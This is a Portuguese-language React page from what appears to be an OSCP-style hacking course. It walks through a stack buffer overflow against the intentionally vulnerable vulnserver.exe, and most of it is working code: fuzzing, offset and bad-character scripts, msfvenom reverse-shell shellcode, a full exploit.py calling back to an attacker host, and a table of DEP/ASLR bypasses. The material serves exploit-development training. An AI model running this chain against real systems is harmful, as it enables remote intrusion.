import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { OutputBlock } from "@/components/ui/OutputBlock";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function BufferOverflow() {
  return (
    <PageContainer
      title="Buffer overflow — do crash ao shell"
      subtitle="Stack-based BOF clássico em x86: fuzz → offset → bad chars → JMP ESP → shellcode → SHELL."
      difficulty="avancado"
      timeToRead="20 min"
    >
      <h2>Por que estudar?</h2>
      <p>
        BOF é a <strong>raiz histórica</strong> do exploit dev — Morris Worm (1988), Code Red,
        Slammer, Eternalblue (que destruiu hospitais em 2017) — todos BOF. Hoje, com DEP/ASLR/CFG,
        BOF puro é raro em alvos modernos, mas o <strong>OSCP</strong>, vários CTFs e dispositivos
        embarcados ainda exigem essa habilidade. Aqui usamos exemplo simples (sem proteções).
      </p>

      <h2>O alvo: vulnserver.exe (Windows x86)</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "wget https://github.com/stephenbradshaw/vulnserver/releases/latest/download/vulnserver.zip && unzip vulnserver.zip",
            out: `unzip vulnserver.zip
inflating: vulnserver.exe
inflating: essfunc.dll
inflating: README.md`,
            outType: "muted",
          },
          {
            comment: "rodar no Win10 (sem DEP/ASLR p/ esse exe — é proposital)",
            cmd: "(no Win10) vulnserver.exe",
            out: `Starting vulnserver version 1.00
Called essential function dll version 1.00

This is vulnerable software!
Do not allow access from untrusted systems or networks!

Waiting for client connections...`,
            outType: "info",
          },
          {
            comment: "do Kali, conectar via nc",
            cmd: "nc 192.168.1.50 9999",
            out: `Welcome to Vulnerable Server! Enter HELP for help.
HELP
Valid Commands:
HELP
STATS [stat_value]
RTIME [rtime_value]
LTIME [ltime_value]
SRUN [srun_value]
TRUN [trun_value]
GMON [gmon_value]
GDOG [gdog_value]
KSTET [kstet_value]
GTER [gter_value]
HTER [hter_value]
LTER [lter_value]
KSTAN [kstan_value]
EXIT`,
            outType: "default",
          },
        ]}
      />

      <h2>Fase 1 — Fuzz: descobrir o crash</h2>
      <CodeBlock
        language="python"
        title="fuzz.py — manda strings progressivamente maiores até crashar"
        code={`#!/usr/bin/env python3
import socket, sys, time

HOST = "192.168.1.50"
PORT = 9999
CMD  = "TRUN /.:/"   # comando suspeito

size = 100
while size < 5000:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))
        s.recv(1024)                                    # banner
        payload = CMD + ("A" * size)
        print(f"[*] Enviando {size} bytes...")
        s.send(payload.encode() + b"\\r\\n")
        s.recv(1024)
        s.close()
        size += 100
        time.sleep(1)
    except Exception as e:
        print(f"[!] Crash em {size} bytes: {e}")
        sys.exit(0)`}
      />

      <Terminal
        path="~"
        lines={[
          {
            cmd: "python3 fuzz.py",
            out: `[*] Enviando 100 bytes...
[*] Enviando 200 bytes...
[*] Enviando 300 bytes...
[...]
[*] Enviando 2000 bytes...
[*] Enviando 2100 bytes...
[!] Crash em 2200 bytes: [Errno 104] Connection reset by peer

(no Win10: vulnserver.exe travou — Immunity Debugger mostra EIP=41414141 = "AAAA" → controlamos EIP!)`,
            outType: "warning",
          },
        ]}
      />

      <h2>Fase 2 — Offset (onde EXATAMENTE EIP é sobrescrito)</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "gerar padrão único de 3000 bytes",
            cmd: "msf-pattern_create -l 3000 > pattern.txt && head -c 80 pattern.txt",
            out: `Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3`,
            outType: "info",
          },
          {
            comment: "modificar fuzz.py: payload = CMD + open('pattern.txt').read() — relança crash",
            cmd: "python3 -c 'import socket; s=socket.socket(); s.connect((\"192.168.1.50\",9999)); s.recv(1024); s.send((\"TRUN /.:/\"+open(\"pattern.txt\").read()).encode()+b\"\\r\\n\")'",
            out: "(silencioso — Win10 trava)",
            outType: "muted",
          },
          {
            comment: "no Immunity Debugger, EIP agora = 386F4337 (4 bytes do pattern)",
            cmd: "msf-pattern_offset -l 3000 -q 386F4337",
            out: `[*] Exact match at offset 2003`,
            outType: "success",
          },
        ]}
      />

      <Terminal
        path="~"
        lines={[
          {
            comment: "validar offset: A*2003 + B*4 → EIP DEVE ser 42424242 ('BBBB')",
            cmd: "python3 -c 'import socket;s=socket.socket();s.connect((\"192.168.1.50\",9999));s.recv(1024);s.send(b\"TRUN /.:/\"+b\"A\"*2003+b\"BBBB\"+b\"C\"*200+b\"\\r\\n\")'",
            out: `(Immunity Debugger: EIP = 42424242 ✓ — confirmado!)`,
            outType: "success",
          },
        ]}
      />

      <h2>Fase 3 — Bad characters</h2>
      <p>
        Alguns bytes "quebram" o input antes de chegar à stack (ex: <code>\x00</code> termina string,
        <code>\x0a</code> = LF). Precisamos identificar e evitar no shellcode.
      </p>

      <CodeBlock
        language="python"
        title="badchars.py — envia byte 0x01..0xff e compara"
        code={`badchars = bytes(range(1, 256))   # \\x01 até \\xff

import socket
s = socket.socket()
s.connect(("192.168.1.50", 9999))
s.recv(1024)
payload = b"TRUN /.:/" + b"A"*2003 + b"BBBB" + badchars
s.send(payload + b"\\r\\n")
s.close()

print("[*] no Immunity, ESP+4 → ler 256 bytes")
print("[*] comparar com 01 02 03 ... ff — bytes faltantes = badchars")`}
      />

      <Terminal
        path="~"
        lines={[
          {
            comment: "comparação visual no Immunity",
            cmd: "(Immunity)",
            out: `ESP+4: 01 02 03 04 05 06 07 08 09 0B 0C 0E 0F ...
                                         ↑     ↑
                                       falta  falta
                                       0x0A   0x0D

Bad chars confirmados: \\x00 \\x0a \\x0d`,
            outType: "warning",
          },
        ]}
      />

      <h2>Fase 4 — Encontrar JMP ESP (controle do EIP)</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "no Immunity (após plugin mona): !mona modules — listar DLLs sem ASLR",
            cmd: "(Immunity command line) !mona modules",
            out: `0BADF00D ----------------------------------------------------------------------
   Module info :
   ----------------------------------------------------------------------
   Base       Top        Size       Rebase   SafeSEH  ASLR   NXCompat   OS Dll  Path
   ---------- ---------- ---------- -------- -------- ------ --------- ------- -----------
   0x62500000 0x62508000 0x00008000 False    False    False  False     False   essfunc.dll  ← bom!
   0x77ec0000 0x77f17000 0x00057000 True     True     True   True      True    USER32.dll`,
            outType: "info",
          },
          {
            comment: "essfunc.dll não tem ASLR/SafeSEH/DEP — busca JMP ESP nela",
            cmd: "(Immunity) !mona jmp -r esp -m essfunc.dll -cpb '\\x00\\x0a\\x0d'",
            out: `Output generated in C:\\mona\\vulnserver\\jmp.txt

[+] Looking for jmp esp instructions in essfunc.dll...
0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False
0x625011bb : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False
[...]
9 pointers found`,
            outType: "success",
          },
        ]}
      />

      <h2>Fase 5 — Gerar shellcode</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.107 LPORT=4444 -b '\\x00\\x0a\\x0d' -f python -v sc EXITFUNC=thread",
            out: `[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1899 bytes

sc =  b""
sc += b"\\xba\\x4f\\xc8\\x91\\x44\\xdb\\xc0\\xd9\\x74\\x24\\xf4\\x5e"
sc += b"\\x33\\xc9\\xb1\\x52\\x83\\xc6\\x04\\x31\\x56\\x0f\\x03\\x56"
sc += b"\\x6f\\xfc\\x5d\\xb2\\xa7\\x42\\xfd\\x4b\\x77\\x91\\x52\\x53"
[...]
sc += b"\\x39\\x12\\x8e\\xed\\x14\\x33"`,
            outType: "info",
          },
        ]}
      />

      <h2>Fase 6 — Exploit final</h2>
      <CodeBlock
        language="python"
        title="exploit.py"
        code={`#!/usr/bin/env python3
"""BOF vulnserver — TRUN command — shell reverso 192.168.1.107:4444"""
import socket, sys

HOST = "192.168.1.50"
PORT = 9999

OFFSET   = 2003
JMP_ESP  = b"\\xaf\\x11\\x50\\x62"          # 0x625011af em little-endian
NOP_SLED = b"\\x90" * 32                    # NOPs antes do shellcode

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.107 LPORT=4444 \\
#   -b '\\x00\\x0a\\x0d' -f python -v sc
sc  = b""
sc += b"\\xba\\x4f\\xc8\\x91\\x44\\xdb\\xc0\\xd9\\x74\\x24\\xf4\\x5e"
sc += b"\\x33\\xc9\\xb1\\x52\\x83\\xc6\\x04\\x31\\x56\\x0f\\x03\\x56"
# ... (cole o resto)

payload  = b"TRUN /.:/"
payload += b"A" * OFFSET                    # padding
payload += JMP_ESP                          # sobrescreve EIP
payload += NOP_SLED                         # area segura para CPU pousar
payload += sc                               # nosso shellcode
payload += b"\\r\\n"

print(f"[*] payload total: {len(payload)} bytes")

s = socket.socket()
s.connect((HOST, PORT))
print(f"[+] {s.recv(1024).decode().strip()}")
s.send(payload)
print("[+] exploit enviado, aguardando shell em :4444")
s.close()`}
      />

      <Terminal
        path="~"
        lines={[
          {
            comment: "1) listener no atacante",
            cmd: "rlwrap nc -lvnp 4444",
            out: "Listening on 0.0.0.0 4444",
            outType: "muted",
          },
          {
            comment: "2) disparar exploit",
            cmd: "python3 exploit.py",
            out: `[+] Welcome to Vulnerable Server! Enter HELP for help.
[*] payload total: 2402 bytes
[+] exploit enviado, aguardando shell em :4444`,
            outType: "info",
          },
          {
            comment: "3) (no listener) callback:",
            cmd: "(listener)",
            out: `Connection received on 192.168.1.50 51442
Microsoft Windows [Version 10.0.19045.5247]
(c) Microsoft Corporation. All rights reserved.

C:\\Users\\victim\\Desktop> whoami
desktop-abc\\victim
C:\\Users\\victim\\Desktop> ipconfig | findstr IPv4
   IPv4 Address. . . . . . . . . . . : 192.168.1.50`,
            outType: "error",
          },
        ]}
      />

      <h2>Cheatsheet do mona</h2>
      <CommandTable
        title="Comandos do plugin mona (Immunity Debugger)"
        variations={[
          { cmd: "!mona config -set workingfolder c:\\mona\\%p", desc: "Set output folder.", output: "Faça uma vez." },
          { cmd: "!mona modules", desc: "Lista DLLs com proteções.", output: "Procure ASLR=False, SafeSEH=False." },
          { cmd: "!mona pc 5000", desc: "Cria pattern de N bytes.", output: "Mais rápido que pattern_create externo." },
          { cmd: "!mona po EIP_VALUE", desc: "Acha offset de um valor encontrado.", output: "Equivale ao pattern_offset." },
          { cmd: "!mona jmp -r esp -m mod.dll -cpb '\\x00'", desc: "Acha JMP ESP em DLL X.", output: "Filtra bad chars." },
          { cmd: "!mona bytearray -b '\\x00\\x0a'", desc: "Gera array de bad-chars test.", output: "Para test de bad chars." },
          { cmd: "!mona compare -f bytearray.bin -a ESP+4", desc: "Compara memory com bytearray.", output: "Mostra bad chars visualmente." },
          { cmd: "!mona seh -m mod.dll", desc: "Acha POP POP RET (SEH overflow).", output: "Para SEH-based BOF." },
          { cmd: "!mona rop -m mod.dll", desc: "Auto-gera ROP chain.", output: "Para bypass de DEP." },
        ]}
      />

      <h2>Proteções modernas (e como bypassar)</h2>
      <CommandTable
        title="Hardening Windows + bypasses"
        variations={[
          { cmd: "DEP (NX bit)", desc: "Stack não-executável.", output: "Bypass: ROP chain (rop2/mona)." },
          { cmd: "ASLR", desc: "Endereços de DLL aleatórios.", output: "Bypass: info leak ou DLL não-ASLR." },
          { cmd: "Stack canary (/GS)", desc: "Cookie aleatório no frame.", output: "Bypass: leak do canary, ou ROP via SEH." },
          { cmd: "SafeSEH", desc: "Tabela de SEH handlers válidos.", output: "Bypass: módulo sem SafeSEH." },
          { cmd: "SEHOP", desc: "Validação de chain SEH.", output: "Bypass mais difícil." },
          { cmd: "CFG (Control Flow Guard)", desc: "Indirect jumps verificados.", output: "Bypass: corrupção de fora do CFG." },
          { cmd: "ACG (Arbitrary Code Guard)", desc: "Edge: bloqueia mark+exec.", output: "Browser exploits virtually morto." },
        ]}
      />

      <PracticeBox
        title="OSCP-style: vulnserver de A a Z"
        goal="Praticar TODA a cadeia: fuzz → offset → bad → jmp → shellcode → shell."
        steps={[
          "Win10 VM → desabilitar Defender + DEP → vulnserver.exe + Immunity + mona.",
          "Kali → fuzz.py em algum comando (TRUN, GMON, etc.).",
          "Confirma offset (msf-pattern_*).",
          "Mapeia bad chars (default: 00, 0a, 0d).",
          "!mona jmp -r esp -m essfunc.dll -cpb '\\x00\\x0a\\x0d'.",
          "msfvenom shellcode TCP reverse, -b badchars.",
          "Monta exploit.py — testa.",
          "Recebe shell em listener.",
        ]}
        command={`# (Win10) vulnserver.exe e Immunity + mona attached

# (Kali)
python3 fuzz.py
# crash em 2200 → roda pattern de 3000

python3 send_pattern.py
# pattern_offset → 2003

python3 send_badchars.py
# Immunity: dump ESP+4, compara, lista 00,0a,0d

# (Immunity) !mona jmp -r esp -m essfunc.dll -cpb '\\x00\\x0a\\x0d'
# escolhe 0x625011af

msfvenom -p windows/shell_reverse_tcp LHOST=KALI LPORT=4444 \\
  -b '\\x00\\x0a\\x0d' -f python -v sc EXITFUNC=thread

# editar exploit.py com sc
rlwrap nc -lvnp 4444  # 1 terminal
python3 exploit.py    # outro terminal`}
        expected={`[*] payload total: 2402 bytes
[+] exploit enviado

(listener)
Connection received on 192.168.1.50 51442
C:\\Users\\victim>`}
        verify="Esse é literalmente o exercício do OSCP. Domine vulnserver = passa a parte BOF da prova."
      />

      <AlertBox type="info" title="Pwntools = padrão moderno">
        Para CTF Linux x86/x64, esqueça Immunity. Use <code>pwntools</code> + <code>gef</code>/<code>pwndbg</code>:
        gera offset com <code>cyclic</code>, encontra gadgets com <code>ROPgadget</code>, monta exploit
        com <code>p64()</code>/<code>flat()</code>. Veja a página de Python para hacking.
      </AlertBox>
    </PageContainer>
  );
}
